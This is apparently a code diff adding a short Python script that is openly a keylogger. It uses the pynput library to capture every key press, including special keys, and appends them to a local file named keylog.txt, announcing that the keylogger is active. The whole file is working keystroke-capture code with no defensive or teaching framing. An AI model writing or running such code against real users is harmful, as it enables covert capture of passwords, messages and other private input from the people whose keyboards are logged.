@@ -1,0 +1,25 @@
+from pynput.keyboard import Key, Listener
+
+# Global variable to store logged keystrokes
+log = ""
+
+# Define the function to write keystrokes to a file
+def write_log(key):
+    global log
+    try:
+        log += key.char  # Attempt to fetch the character pressed
+    except AttributeError:
+        if key == Key.space:
+            log += " "
+        else:
+            log += " " + str(key) + " "
+
+    # Write log to file
+    with open("keylog.txt", "a") as f:
+        f.write(log)
+        log = ""  # Clear the log after writing
+
+# Create a listener instance
+with Listener(on_press=write_log) as listener:
+    display("Keylogger is active. Press 'Stop' button to terminate.")
+    listener.join()
